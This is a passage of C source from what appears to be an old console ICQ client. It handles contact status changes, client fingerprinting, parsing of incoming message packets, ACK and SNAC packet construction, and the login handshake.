        case FINGERPRINT_STRICQ_CLIENT:
            victim->fprint = FINGERPRINT_STRICQ_CLIENT;
            break;

        case FINGERPRINT_MICQ_CLIENT:
            victim->fprint = FINGERPRINT_MICQ_CLIENT;
            break;

        case FINGERPRINT_LIB2K_CLIENT:
            victim->fprint = FINGERPRINT_LIB2K_CLIENT;
            break;

        case FINGERPRINT_YSM_CLIENT:
            victim->fprint = FINGERPRINT_YSM_CLIENT;
            break;

        case FINGERPRINT_YSM_CLIENT_CRYPT:
            victim->fprint = FINGERPRINT_YSM_CLIENT_CRYPT;
            break;

        case FINGERPRINT_TRILLIAN_CLIENT:
            victim->fprint = FINGERPRINT_TRILLIAN_CLIENT;
            break;

        case FINGERPRINT_MICQ2003A_CLIENT_1:
        case FINGERPRINT_MICQ2003A_CLIENT_2:
            victim->fprint = FINGERPRINT_MICQ2003A_CLIENT_1;
            break;

        case FINGERPRINT_MICQLITE_CLIENT:
            victim->fprint = FINGERPRINT_MICQLITE_CLIENT;
            break;

        /* maybe it was detected inside YSM_ParseCapabilities */
        /* but if its v8 lets say its an icq 2003 pro A */
        default:
            if (victim->d_con.version == 0x08)
                victim->fprint = FINGERPRINT_MICQ2003A_CLIENT_1;
            break;
    }

    /* clear slave fields if its going offline. */
    if (status == STATUS_OFFLINE) {
        victim->caps    = 0;
        victim->fprint    = 0;
    }

    /* increment the global online amount index */
    if (victim->status == STATUS_OFFLINE && status != STATUS_OFFLINE )
        g_sinfo.onlineslaves++;

    /* Slave Timestamps */
    if (victim->status != status) {
        if (victim->status == STATUS_OFFLINE) {
            /* If it's the first time we see this
             * slave, don't update the status change.
             */

            if (victim->timing.Signon == 0)
                victim->timing.StatusChange = 0;
            else
                victim->timing.StatusChange = onsince;

            victim->timing.Signon = onsince;

        } else {
            victim->timing.StatusChange = current_time;
        }
    }



    /* is the slave in our ignore list? don't bother us with their
     * status changes, we dont care, we might really hate that slave */

    if (victim->BudType.IgnoreID) {
        victim->status = status;
        return;
    }

#ifdef YSM_SILENT_SLAVES_STATUS
    /* only print offline->online or online->offline changes */
    if (victim->status != STATUS_OFFLINE && status != STATUS_OFFLINE ) {
        victim->status = status;
        return;
    }
#endif

    /* Fix for a known bug where the server keeps re-sending us */
    /* the status of each slave even though its the very same */
    /* unchanged */
    if (victim->status == status) return;

    /* ONCOMINGUSER event */
    if (victim->status == STATUS_OFFLINE && status != STATUS_OFFLINE)
        YSM_Event( EVENT_ONCOMINGUSER,
            victim->uin,
            victim->info.NickName,
            0,
            NULL,
            0 );

    /* OFFGOINGUSER event */
    else if (victim->status != STATUS_OFFLINE && status == STATUS_OFFLINE)
        YSM_Event( EVENT_OFFGOINGUSER,
            victim->uin,
            victim->info.NickName,
            0,
            NULL,
            0 );

    g_promptstatus.flags |= FL_OVERWRITTEN;

    /* are we in CHAT MODE ? we dont print messages which don't belong
     * to our chat session!. */
    if (g_promptstatus.flags & FL_CHATM) {
        if (victim == NULL || !(victim->flags & FL_CHAT))
            return;
    }

#if defined(YSM_WITH_THREADS)
    /* if the display is busy make the thread sleep for 2 secs */
    while((g_promptstatus.flags & FL_BUSYDISPLAY) || (g_promptstatus.flags & FL_COMFORTABLEM)) YSM_Thread_Sleep( 2, 0 );
#endif

    /* Is this slave's Birthday? */
    if (victim->BudType.birthday == 0x1) {

        PRINTF( VERBOSE_BASE, "\r""%s"" Notice for "
            "slave ""%s""\n",
            MSG_SLAVES_BIRTHDAY,
            victim->info.NickName );

        /* only inform once this way */
        victim->BudType.birthday = 0x2;
    }

    /* Is this slave on our Alert list ? */
    if (victim->flags & FL_ALERT)
    {
        PRINTF(VERBOSE_BASE, "\r<<[SLAVE A L E R T]>>\n");
    }

    /* Okie, now print the status change line */

#ifndef COMPACT_DISPLAY
    PRINTF( VERBOSE_STCHANGE,
            "\r%.8s "
            MSG_STATUS_CHANGE1
            "%d"
            MSG_STATUS_CHANGE2
            " %.10s "
            MSG_STATUS_CHANGE3
            " %.9s]\n",
            time_string,
            victim->uin,
            victim->info.NickName,
            status_string);
#else
    YSM_WriteStatus(victim->status, oldstatus_string);

    PRINTF( VERBOSE_STCHANGE,
            "\r%-5.5s %-10.10s" 
            " %-9.9s -> "
            "%s\n",
            time_string,
            victim->info.NickName,
            oldstatus_string,
            status_string);
#endif

    victim->status = status;
    g_promptstatus.flags |= FL_RAW;
}

static void
YSM_TreatMessage( int type,
    int    tsize,
    char    *data,
    char    *uin,
    char    *status,
    char    *msgid )
{
slave_t    *victim = NULL;

    victim = YSM_QuerySlaves(SLAVE_UIN, NULL, atoi(uin), 0);
    switch(type)
    {
                case 0x01:      /* Normal Msg. */
            YSM_ReceiveMessageType1( victim,
                        tsize,
                        data,
                        uin,
                        status,
                        msgid );
                break;

        case 0x02:    /* Complex Msg, yack! */
            YSM_ReceiveMessageType2( victim,
                        tsize,
                        data,
                        uin,
                        status,
                        msgid );
                break;

        case 0x04:    /* Utility Msg. */
            YSM_ReceiveMessageType4( victim,
                        tsize,
                        data,
                        uin,
                        status );
                break;
        default:
            PRINTF( VERBOSE_MOATA,
                "YSM_TreatMessage: "
                "Unknown type (%.2x) received.\n",
                type );
            break;
    }
}


void
YSM_ReceiveMessage( FLAP_Head *flap, SNAC_Head *snac, char *data )
{
char    WarnLVL[2], TLVnum[2], r_statusflags[2], r_status[2];
char    MsgID[8], MsgFormat[2], *r_uin;
int    tsize = 0, uinsize = 0, len = 0, foundtlv = FALSE;
TLV    thetlv;

        memcpy( &MsgID, data+tsize, sizeof( MsgID ) );
        tsize += sizeof( MsgID );

        memcpy( &MsgFormat, data+tsize, sizeof( MsgFormat ));
        tsize += sizeof( MsgFormat );

        uinsize = data[tsize];
        tsize += 1;

        r_uin = ysm_calloc(1, uinsize+1, __FILE__, __LINE__);
        if (!r_uin || uinsize+1 < 1) return;

        memcpy( r_uin, data+tsize, uinsize );
        tsize += uinsize;

        memcpy( &WarnLVL, data+tsize, sizeof( WarnLVL ) );
        tsize += sizeof( WarnLVL );

        memcpy( &TLVnum, data+tsize, sizeof( TLVnum ));
        tsize += sizeof( TLVnum );

    /* When there is no data, we just get a single TLV */
    /* to avoid any problems, we analyze the packet right now */

    /* btw, we cant use TreatMessage here since we handle it */
    /* in a pretty different way. */

        if (Chars_2_Word( TLVnum ) == 0) {
            /* weird it is..but it seems WWP messages sent through icq.com carry not TLVs..
             * we'll make a sanity check anyway only allowing messages type 4..
             */
            if (Chars_2_Wordb(MsgFormat) == 0x4) {
                YSM_ReceiveMessageType4( NULL,
                                        tsize,
                                        data,
                                        r_uin,
                                        r_status );
            }

            ysm_free( r_uin, __FILE__, __LINE__ );
            r_uin = NULL;
            return;
        }


        while(!foundtlv
    && tsize <= (Chars_2_Wordb( flap->dlen ) - SNAC_HEAD_SIZE))
        {
                memcpy(&thetlv, data+tsize, sizeof(TLV));
                tsize += sizeof(TLV);

                len = Chars_2_Wordb(thetlv.len);

                switch(Chars_2_Wordb(thetlv.type))
                {

                    case 0x03:      /* user login timestamp */
                        tsize += len;
                        break;

                    case 0x13:        /* no idea what this is, just yet */
                        tsize += len;
                        break;

                    case 0x02:        /* start of Message data */

                        YSM_TreatMessage( Chars_2_Wordb(MsgFormat),
                            tsize-sizeof(TLV),    /* we want start of TLV */
                            data,
                            r_uin,
                            r_status,
                            MsgID );

                        foundtlv = TRUE;
                        break;

                    case 0x06:      /* senders status */
                        memcpy( &r_statusflags, data+tsize, 2 );
                        tsize += 2;
                        memcpy( &r_status, data+tsize, 2 );
                        tsize += 2;
                        break;

                    case 0x05:        /* possibly strange utility msg. */
                    /* 1/19/2007 - The ICQ protocol appears to have changed.
                     * We now get a TLV type 5 before the actual TLV type 5
                     * with message data arrives. As it always seems to
                     * carry just 4 bytes, the check saves our day.
                     */
                        if (len == 4) {
                            tsize += len;
                            break;
                        }

                        YSM_TreatMessage( Chars_2_Wordb(MsgFormat),
                            tsize - sizeof(TLV),    /* start at 0x05 */
                            data,
                            r_uin,
                            r_status,
                            MsgID );
                        foundtlv = TRUE;
                        break;

                    default:
                        tsize += len;
                        break;
                }
        }

        ysm_free(r_uin, __FILE__, __LINE__);
        r_uin = NULL;
}

void
YSM_ReceiveMessageType1( slave_t    *victim,
        int32_t        tsize,
        u_int8_t    *data,
        int8_t        *r_uin,
        int8_t        *r_status,
        int8_t        *m_id )
{
int8_t        foundtlv = FALSE;
int16_t        m_len = 0;
int32_t        MsgTLV = 0, len = 0;
u_int32_t    fprint = 0x0;
u_int8_t    m_flags = 0;
TLV        thetlv;

    if (victim) victim->timing.LastMessage = time(NULL);


    memset(&thetlv, '\0', sizeof(TLV));
    memcpy(&thetlv, data+tsize, sizeof(TLV));

    MsgTLV = Chars_2_Wordb(thetlv.len);
    MsgTLV += tsize;

    /* Skip the first 0x2 TLV */
    tsize += sizeof(TLV);

    /* to have a limit in case anything happends */
        while(!foundtlv && tsize < MsgTLV) {
        memset( &thetlv, '\0', sizeof(TLV) );
        memcpy( &thetlv, data+tsize, sizeof(TLV));
                tsize += sizeof(TLV);
                len = Chars_2_Wordb(thetlv.len);

                switch(Chars_2_Wordb(thetlv.type))
                {
                        case 0x0101:      /* Message TLV */
                m_len = Chars_2_Wordb( thetlv.len ) - 4;

                /* here comes encoding information:
                    0x0000 -> US-ASCII
                    0x0002 -> UCS-2BE
                 */

                if (*(data+tsize+1) == 0x02) {
                    /* its UTF-16 (UCS-2BE) */
                    m_flags |= MFLAGTYPE_UCS2BE;
                }

                tsize += 4;
                                foundtlv = TRUE;
                                break;

                        default:
                                tsize += len;
                                break;
                }
        }

    /* No boy, get out now */
    if (!foundtlv) return;

    /* only update message fingerprint if none was chosen already */
    if (victim && victim->fprint == 0)
        victim->fprint = fprint;

    /* only normal messages come in type1 */
    YSM_ReceiveMessageData( victim,
                r_uin,
                Chars_2_Wordb(r_status),
                0x01,
                m_flags,
                m_len,
                data+tsize );
}

/* This function can be called from DC PEER_MSGs as well as from
 * ReceiveMessageType2() since the main type2 message body is
 * the same for both. If dc_flag is TRUE, it was called from DC.
 */

int32_t
YSM_ReceiveMessageType2Common( slave_t    *victim,
        int32_t         tsize,
        u_int8_t    *data,
        int8_t        *r_uin,
        int8_t        *r_status,
        int8_t        *m_id,
        u_int8_t    m_flags,
        u_int16_t    *pseq,
        int8_t        dc_flag )
{
int8_t    m_len[2], m_priority[2], m_type = 0, *pguid = NULL;
int16_t    m_status = 0;
int32_t    ret = TRUE;

    tsize += 2;    /* Some Length        */
    memcpy(pseq, data + tsize, 2);
    tsize += 2;    /* SEQ2            */
    tsize += 12;    /* Unknown         */

    m_type = data[tsize];
    tsize += 2;    /* Msg Type+flags    */
    memcpy(&m_status, data + tsize, 2);
    tsize += 2;    /* Status        */
    memcpy(&m_priority, data + tsize, 2);
    tsize += 2;    /* Priority        */
    memcpy(&m_len, data + tsize, 2);
    tsize += 2;    /* Msg Length        */

    /* empty messages sent by icq 2002/2001 clients are ignored */
    if ((Chars_2_Word(m_len) <= 0x1)
        && m_priority[0] == 0x02  && m_priority[1] == 0x00) {
        return ret;
    }

    /* after the message data, there might be a GUID identifying
     * the type of encoding the sent message is in.
     * if the message type is a MESSAGE, GUIDs come after
     * 8 bytes of colors (fg(4) + bg(4))
     */
    pguid = data+tsize+Chars_2_Word(m_len);
    if (m_type == YSM_MESSAGE_) pguid += 8;

    if ((u_int32_t)(*pguid) == 0x26    /* size of the UTF8 GUID */
    && !memcmp(pguid+4, CAP_UTF8_GUID, sizeof(CAP_UTF8_GUID))) {
        m_flags |= MFLAGTYPE_UTF8;
    }

    if (dc_flag) /* dirty hack for ICQ 2003a, thanks samm at os2 dot ru */
        m_flags |= MFLAGTYPE_UTF8;

    /* m_status in type2 messages depending on the message subtype
     * will be the user'status or the message status.
     */

    ret = YSM_ReceiveMessageData( victim,
                r_uin,
                m_status,
                m_type,
                m_flags,
                Chars_2_Word(m_len),
                data+tsize);

    if (ret > 1) {
        if (!dc_flag)
            YSM_SendACKType2( r_uin, (int8_t *)pseq, m_type, m_id );
#ifdef YSM_WITH_THREADS
        else
            YSM_DC_MessageACK( victim, m_type );
#endif
    }

    return ret;
}

void
YSM_ReceiveMessageType2( slave_t    *victim,
    int32_t        tsize,
    u_int8_t    *data,
    int8_t        *r_uin,
    int8_t        *r_status,
    int8_t        *msgid)
{
int32_t        MsgTLV = 0;
int16_t        tmplen = 0, cmd = 0;
int8_t        foundtlv = FALSE, msgseq[2], m_type[4];
u_int8_t    m_flags = 0;
TLV        thetlv;

    if (victim) victim->timing.LastMessage = time(NULL);

    memset( &thetlv, '\0', sizeof(TLV) );
    memcpy( &thetlv, data+tsize, sizeof(TLV));
    MsgTLV = Chars_2_Wordb(thetlv.len);
    MsgTLV += tsize;

    /* Skip the first 0x5 TLV */
    tsize += sizeof(TLV);
    memcpy( &cmd, data+tsize, 2 );
    tsize += 2;        /* ACK TYPE */
                /* 0x0000 -> Text Message    */
                /* 0x0001 -> Abort Request    */
                /* 0x0002 -> File ACK        */

    switch (cmd) {
        case 0x0000:
            m_flags |= MFLAGTYPE_NORM;
            break;

        case 0x0001:
            m_flags |= MFLAGTYPE_END;
            break;

        case 0x0002:
            m_flags |= MFLAGTYPE_ACK;
            break;

        default:
            PRINTF( VERBOSE_MOATA,
                "ReceiveMessageType2: unknown cmd(%d).\n",
                 cmd );
            return;
    }

    tsize += 8;        /* timestamp + random msg id */
    tsize += 16;        /* capabilities */


    /* to have a limit in case anything happends */
        while(!foundtlv && tsize < MsgTLV) {
        memset( &thetlv, '\0', sizeof(TLV) );
        memcpy( &thetlv, data+tsize, sizeof(TLV));
                tsize += sizeof(TLV);
                tmplen = Chars_2_Wordb(thetlv.len);

                switch(Chars_2_Wordb(thetlv.type))
                {
                        case 0x2711:      /* Message C TLV */
                tsize += 2;    /* len till SEQ1    */
                tsize += 2;    /* TCP Version #    */
                tsize += 16;    /* Capabilities        */
                tsize += 3;    /* Unknown        */
                memcpy( &m_type, data+tsize, 4 );
                tsize += 4;    /* 0x00000000 -> Normal Msg
                           0x00000004 -> File OK/Req */

                tsize += 2;    /* SEQ1            */
                foundtlv=TRUE;
                break;

            case 0x3:
                tsize += tmplen;
                break;

            case 0x5:
                tsize += tmplen;
                break;

            case 0x4:
                tsize += tmplen;
                break;

                        default:
                                tsize += tmplen;
                                break;
                }
        }

    /* No boy, get out now */
    if (!foundtlv) return;

    YSM_ReceiveMessageType2Common( victim,
                    tsize,
                    data,
                    r_uin,
                    r_status,
                    msgid,
                    m_flags,
                    (u_int16_t *)&msgseq,
                    0x00 );
}

void
YSM_ReceiveMessageType4( slave_t    *victim,
        int32_t        tsize,
        u_int8_t    *data,
        int8_t        *r_uin,
        int8_t        *r_status )
{
int8_t        m_length[2], m_type = 0;

    tsize += 4;    /* tlv(5) */
    tsize += 4;    /* unknown */

    m_type = data[tsize];
    tsize ++;    /* m_type */
    tsize ++;    /* Msg flags */

    memcpy( &m_length, data+tsize, 2 );
    tsize += 2;    /* Msg Length */

    YSM_ReceiveMessageData( victim,
                r_uin,
                Chars_2_Wordb(r_status),
                m_type,
                0x00,
                Chars_2_Word(m_length),
                data+tsize );
}

/*
 * The return value of this function should tell its caller if its
 * required to send an ACK, since certain m_types dont require ACKS.
 * ret = 0 -> something happened, error type normal (DC handles this)
 * ret < 0 -> something happened, error type critical (DC handles this)
 * ret = 1 -> everything went ok, dont send an ACK.
 * ret > 1 -> everything went ok, send an ACK.
 */

int32_t
YSM_ReceiveMessageData( slave_t    *victim,
            int8_t        *r_uin,
            int16_t        r_status,
            int8_t        m_type,
            u_int8_t    m_flags,
            int16_t        m_len,
            int8_t        *m_data )
{
int8_t    *datap = NULL, *message = NULL, *preason = NULL;
int32_t    i = 0, c = 0, ret = 2;

    /* Are we in Antisocial mode? */
    if (victim == NULL
    && g_cfg.antisocial && m_type != YSM_MESSAGE_AUTH) return 0;

    /* the incoming message is an LNTS, not a stringz */
    message = ysm_calloc(1, m_len+1, __FILE__, __LINE__);
    memcpy(message, m_data, m_len);

    switch (m_type) {

        case YSM_MESSAGE_:

            if (victim) {
                g_state.last_read = victim;
            }

            datap = message;
            break;

        case YSM_MESSAGE_AUTH:

            for ( i = 0; i < m_len; i++ ) {
                if ((u_int8_t)message[i] == 0xfe) c++;

                /* on the 5th 0xfe we have the reason msg */
                if (c == 5) {
                    preason = strchr(message + i, 0xfe);
                    if (preason != NULL)
                        preason++;
                    else
                        preason = "No Reason";

                    /* Break out of the for loop! */
                    break;
                }
            }

            datap = preason;
            break;

        case YSM_MESSAGE_CONTACTS:
            datap = message;
            break;

        case YSM_MESSAGE_ADDED:        /* these msgs lack of data */
        case YSM_MESSAGE_AUTHOK:
        case YSM_MESSAGE_AUTHNOT:
            datap = NULL;
            break;

        case YSM_MESSAGE_URL:
            datap = message;
            break;

        case YSM_MESSAGE_PAGER:
            datap = message + 1;
            break;

        case YSM_MESSAGE_GREET:
            /* only with slaves */
            if (victim != NULL) {

            /* we use m_data and not message here because these
             * messages had a blank LNTS before them. Tricky huh. */

#ifdef YSM_WITH_THREADS
                ret = YSM_DC_IncomingMessageGREET( victim,
                            m_type,
                            m_flags,
                            m_data,
                            m_len,
                            r_status );
#endif
            }

            if (message != NULL) {
                ysm_free(message, __FILE__, __LINE__);
                message = NULL;
            }

            return ret;

        case YSM_MESSAGE_FILE:
            /* only with slaves */
            if (victim != NULL) {

            /* This is done in v7, but, clients such as TRILLIAN
             * who identify theirselves as v8 clients, still send
             * this. What a pain in the ass man, come on!.
             */
#ifdef YSM_WITH_THREADS
                ret = YSM_DC_IncomingMessageFILE( victim,
                                m_type,
                                m_flags,
                                m_data,
                                m_len,
                                r_status );
#endif
            }

            if (message != NULL) {
                ysm_free(message, __FILE__, __LINE__);
                message = NULL;
            }

            return ret;

        default:
            PRINTF( VERBOSE_MOATA,
                "YSM_ReceiveMessageData: "
                "Unknown m_type received.\n" );

            return 1;
    }

    YSM_DisplayMsg( m_type,
            victim ? victim->uin : atoi(r_uin),
                victim ? victim->status : r_status,
            m_len,
            datap,
            m_flags,
                victim ? victim->info.NickName : NULL,
            victim ? (victim->flags & FL_LOG) : 0x0 );

    if (message != NULL) {
        ysm_free(message, __FILE__, __LINE__);
        message = NULL;
    }

    return ret;
}
void
YSM_SendACKType2( int8_t    *r_uin,
        int8_t        *pseq,
        int8_t        m_type,
        int8_t        *m_id )
{
char    Format[2], Type[2], reqid[4];
char    *data;
int    dlen =0, pos =0;

    memset(reqid,'\0',4);
    memset(Type,'\0',2);
    memset(Format,'\0',2);
    Word_2_Charsb(Format,0x0002);

    dlen = 4 + 4;            /* msgid */
    dlen += 2;            /* msg format */
    dlen ++;            /* uin len */
    dlen += strlen(r_uin)+1;     /* uin + 0 */
    dlen += 2;            /* 0x03 */
    dlen += 2;            /* 0x1B00 */
    dlen += 2;            /* cli version */
    dlen += 4 + 4 + 4 + 4;        /* unk */
    dlen += 2;            /* unk */
    dlen += 4;            /* 0x03000000 */
    dlen ++;            /* unk */
    dlen += 2;            /* cookie? */
    dlen += 2;            /* 0x0E00 */
    dlen += 2;            /* cookie? */
    dlen += 4 + 4 + 4;        /* unk */
    dlen ++;            /* Msg type */
    dlen ++;            /* Msg Flags */
    dlen += 4;            /* unk */
    dlen += 2;            /* 0x0100 */
    dlen ++;            /* 0x00 */
    dlen += 4;            /* 0x00000000 */
    dlen += 4;            /* 0xffffff00 */

    data = ysm_calloc(1, dlen, __FILE__, __LINE__);

    memcpy(&data[pos], m_id, 8);
    pos += 8;
    memcpy(&data[pos], &Format, 2);
    pos += 2;

    data[pos] = strlen(r_uin);
    pos ++;
    memcpy(&data[pos], r_uin, strlen(r_uin));
    pos += strlen(r_uin);
    pos ++;  /* zero */

    data[pos] = 0x03;
    data[pos+1] = 0x1B;
    pos += 2;

    data[pos+1] = YSM_PROTOCOL_VERSION;
    pos += 2;        /* icq version */

    pos += 17;    /* unk */
    pos += 2;

    data[pos] = 0x03;
    pos += 4;

    pos ++;

    memcpy(&data[pos], pseq, 2);
    pos += 2;        /* seq? */

    data[pos] = 0x0E;
    pos += 2;

    memcpy(&data[pos], pseq, 2);
    pos += 2;        /* seq? */

    pos += 12;

    data[pos] = m_type;
    pos += 2;

    pos += 4;
    data[pos] = 0x01;
    pos += 2;            /* 0x0100 */

    pos ++;            /* 0x00 */
    pos += 4;            /* 0x00000000 */

    data[pos] = (char)0xff;
    data[pos+1] = (char)0xff;
    data[pos+2] = (char)0xff;
    pos += 4;            /* 0xffffff00 */

    reqid[3] = 0x0b;

    YSM_SendSNAC( 0x04,
            0x0b,
            0x0,
            0x0,
            data,
            pos,
            g_sinfo.seqnum++,
            reqid);

        ysm_free(data, __FILE__, __LINE__);
        data = NULL;
}


int32_t
YSM_SendSNAC( int    Family,
    int        Subtype,
    int8_t        FlA,
    int8_t        FlB,
    const char    *data,
    u_int32_t    size,
    int32_t        lseq,
    char        *reqid )
{
int32_t        ReqID;
int        nseq = 1,bsize = 0;
char        *buf = NULL;

    bsize = SNAC_HEAD_SIZE + FLAP_HEAD_SIZE + size;

    /*
     * create by hand the headers from definition, to avoid padding
     * flap is int8_t + int8_t + int8_t[2] + int8_t[2] = 6
     * snac is int8_t[2] + int8_t[2] + int8_t + int8_t + int32_t = 10
     */
    buf = ysm_calloc(1, bsize, __FILE__, __LINE__);

    srand((unsigned int) time(NULL));
    Word_2_Charsb(&buf[FLAP_HEAD_SIZE], Family);
    Word_2_Charsb(&buf[FLAP_HEAD_SIZE + 2], Subtype);
    buf[FLAP_HEAD_SIZE + 4] = (int8_t) FlA;
    buf[FLAP_HEAD_SIZE + 5] = (int8_t) FlB;
    ReqID = rand() & 0xffffff7f;

    if(reqid == NULL)
        memcpy(&buf[FLAP_HEAD_SIZE + 6], &ReqID, sizeof(int32_t));
    else
        memcpy(&buf[FLAP_HEAD_SIZE + 6], &reqid[0], 4);

    /* copy the data */
    if(data != NULL)
    memcpy(&buf[FLAP_HEAD_SIZE + SNAC_HEAD_SIZE], data, (size_t) size);

    buf[0] = 0x2a;    /*siempre */
    buf[1] = 0x2;    /*los snacs solo van en channel 2 */

    nseq += lseq ;     /* 1+= last seq == new seq */

    Word_2_Charsb(&buf[2], nseq);

    g_sinfo.seqnum = nseq;        /* Update the global SEQ trace! */

    Word_2_Charsb(&buf[4], bsize - FLAP_HEAD_SIZE);

    PRINTF( VERBOSE_PACKET, "[OUTGOING Packet]\n");
    DumpPacket((FLAP_Head *)buf, buf+FLAP_HEAD_SIZE);

    if (YSM_WRITE(YSM_USER.network.rSocket, buf, bsize) < 0) {
        ysm_free(buf, __FILE__, __LINE__);
        buf = NULL;
        return -1;
    }

    ysm_free(buf, __FILE__, __LINE__);
    buf = NULL;
    return ReqID;
}

/* LoginSequence takes care of logging in to the Authentication
 * server, getting the cookie, and logging in to the BOS server.
 */

int32_t
YSM_LoginSequence( uin_t uin, int8_t *password )
{
u_int32_t     datasize = 0, pos = 0;
int32_t        r = 0;
int8_t        *data = NULL, suin[MAX_UIN_LEN+1], *buf = NULL;
TLV        thetlv;
SNAC_Head    snac;
FLAP_Head    head;

    /* First send a 17,6 SNAC. This way, we request a random
     * key from the server in order to do an MD5 login.
     */

    snprintf(suin, MAX_UIN_LEN, "%d", (int)uin);
    suin[sizeof(suin) - 1] = 0x00;

    datasize = sizeof(TLV) + strlen(suin);    /* screen name */
    datasize += sizeof(TLV);        /* unknown */
    datasize += sizeof(TLV);        /* unknown */

    data = ysm_calloc(1, datasize, __FILE__, __LINE__);
    memset(&thetlv, 0, sizeof(TLV));

    Word_2_Charsb(thetlv.type, 0x1);
    Word_2_Charsb(thetlv.len, strlen(suin));

    memcpy(data+pos, &thetlv, sizeof(TLV));
    pos += sizeof(TLV);

    memcpy(data+pos, suin, strlen(suin));
    pos += strlen(suin);

    Word_2_Charsb(thetlv.type, 0x4B);
    Word_2_Charsb(thetlv.len, 0x0);

    memcpy(data+pos, &thetlv, sizeof(TLV));
    pos += sizeof(TLV);

    Word_2_Charsb(thetlv.type, 0x5A);
    Word_2_Charsb(thetlv.len, 0x0);

    memcpy(data+pos, &thetlv, sizeof(TLV));
    pos += sizeof(TLV);

    if (YSM_SendSNAC( 17, 6,
            0x0,
            0x0,
            data,
            pos,
            g_sinfo.seqnum++,
            NULL) < 0) {

        return -1;
    }

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;

    /* ok we sent the first SNAC, we have to receive 17, 07
     * as a valid response
     */

    memset(&head, 0, sizeof(head));

    r = YSM_READ( YSM_USER.network.rSocket,
            &head,
            FLAP_HEAD_SIZE,
            0 );

    if (r < 1 || r != FLAP_HEAD_SIZE) return -1;

    buf = ysm_calloc(1, Chars_2_Wordb(head.dlen)+1, __FILE__, __LINE__);

    r = YSM_READ(YSM_USER.network.rSocket,
        buf,
        Chars_2_Wordb(head.dlen),
        0 );

    if (r < 1 || r != Chars_2_Wordb(head.dlen)) return -1;

    memcpy( &snac, buf, SNAC_HEAD_SIZE );

    if (snac.ReqID == 0x23) return 1;

    return 0;
}

void YSM_Init_LoginA(uin_t uin, u_int8_t *password)
{
    FLAP_Head   head;
    int32_t     tsize = 0, ret;
    char        buf[4];
    char        UinStr[MAX_UIN_LEN+1];
    char        PasswdStr[strlen(password)];
    int8_t     *profile="ICQ Inc. - Product of ICQ (TM).2003a.5.47.1.3800.85";
    int32_t     dwordver = 0x55000000;
    int32_t     unkdata = 0x0A01, majorver = 0x0500, minorver = 0x2f00;
    int32_t     lesserver = 0x0100, paqsize, newseq;
    int32_t     buildver = 0xd80e, r = 0;
    int8_t     *paquete = NULL;

    memset(&head, '\0', sizeof(head));
    memset(buf, '\0', 4);

    snprintf(UinStr, MAX_UIN_LEN, "%d", (int)uin);
    UinStr[sizeof(UinStr) - 1] = 0x00;

    r = YSM_READ(YSM_USER.network.rSocket,
            &head,
            FLAP_HEAD_SIZE,
            1);

    if (r < FLAP_HEAD_SIZE) return;

    r = YSM_READ(YSM_USER.network.rSocket,
            &buf,
            sizeof(buf),
            1);

    if (r < (int32_t)sizeof(buf)) return;

    /* El server nos manda listo para login en la data 0001 */
    if (!buf[0] && !buf[1] && !buf[2] && buf[3] == 1)
    {
        /* update the logging in status bar */
        PRINTF(VERBOSE_BASE, "**");

        /* En el paquete va el FLAPHead, 4 bytes de data, y 11 TLV's */
        paqsize = strlen(UinStr) + strlen(password) + strlen(profile) + 18;
        paqsize += 11 * sizeof(TLV);
        paqsize += FLAP_HEAD_SIZE + 4;

        paquete = ysm_calloc(1, paqsize, __FILE__, __LINE__);

        /* We Leave space for the Flap Head */
        tsize += FLAP_HEAD_SIZE;

        /* We copy the 0001 as reply  */
        memcpy(paquete+tsize, &buf, 4);
        tsize += 4;

        /* TLV type 1 */
        tsize += InsertTLV(UinStr, 0x1, paquete+tsize, strlen(UinStr));

        memset(PasswdStr,'\0',sizeof(PasswdStr));
        EncryptPassword(password,PasswdStr);

        /* TLV type 2 */
        tsize += InsertTLV(PasswdStr,0x2,paquete+tsize,strlen(password));

        /* TLV type 3 */
        tsize += InsertTLV(profile,0x3,paquete+tsize,strlen(profile));

        /* TLV type 16 */
        tsize += InsertTLV(&unkdata,0x16,paquete+tsize,2);

        /* TLV type 17 */
        /* major version 4 icq2000 5 icq2001 */
        tsize += InsertTLV(&majorver,0x17,paquete+tsize,2);

        /* Estos que siguen son valores que supongo que no importan  */
        /* que tienen, pero todos son WORD. */
        tsize += InsertTLV(&minorver,  0x18, paquete+tsize, 2);
        tsize += InsertTLV(&lesserver, 0x19, paquete+tsize, 2);
        tsize += InsertTLV(&buildver,  0x1A, paquete+tsize, 2);
        tsize += InsertTLV(&dwordver,  0x14, paquete+tsize, 4);

        /* and the final 4 bytes - Language and Country */
        tsize += InsertTLV("en",0x0F,paquete+tsize,2);     /* TLV type 0F */
        tsize += InsertTLV("us",0x0E,paquete+tsize,2);     /* TLV type 0E */

        /* Flap HEAD -- Replace the first sizeof(FLAP_Head) bytes */
        /* with the new Flap HEADER. */

        newseq = Chars_2_Wordb(head.seq);
        newseq++;
        Word_2_Chars(head.seq, newseq);

        tsize -= sizeof(FLAP_Head);

        /* Data Len means without the header file! */
        Word_2_Charsb(head.dlen, tsize - sizeof(FLAP_Head));
        memcpy(paquete, &head, sizeof(FLAP_Head));

        /* Cruzar dedos y mandar el paquete de Login -A- */
        YSM_WRITE(YSM_USER.network.rSocket, paquete, tsize);

        PRINTF(VERBOSE_MOATA, "Login A Sent to the Server\n");

        YSM_FREE(paquete);
        g_state.reconnecting = FALSE;
    }
    else
    {
        PRINTF(VERBOSE_MOATA,
             "Login Init A Failure, bad Server Response.\n");
        PRINTF(VERBOSE_MOATA,
             "The reply should have been 0001. Exiting..\n");
        YSM_ERROR(ERROR_CRITICAL, 1);
    }

    /* update the logging in status bar */
    PRINTF(VERBOSE_BASE, "**");
}

void YSM_Init_LoginB(FLAP_Head *head, int8_t *buf, int32_t buflen)
{
    TLV      thetlv;
    int32_t  len, x = 0;
    int8_t  *a = NULL, *cookie = NULL;

    if (head == NULL || buf == NULL || buflen <= 0)
        return;

    if (buflen < Chars_2_Wordb(head->dlen) ||
        buflen <= (int32_t)sizeof(thetlv))
        return;

    while (x < Chars_2_Wordb(head->dlen))
    {
        memcpy(&thetlv, buf+x, sizeof(thetlv));
        x += sizeof(TLV);
        len = Chars_2_Wordb(thetlv.len);

        switch(Chars_2_Wordb(thetlv.type))
        {
            case 0x1:
            case 0x8e:
            /* reply from srv. */
            break;

            case 0x5:

            if ((a = strchr(&buf[x], ':')) == NULL)
                return;

            *a++ = '\0';

            memset(YSM_USER.network.cookie_host, '\0', MAX_PATH);
            strncpy( YSM_USER.network.cookie_host,
                    &buf[x],
                sizeof(YSM_USER.network.cookie_host) - 1);

            /* 5190 is default */
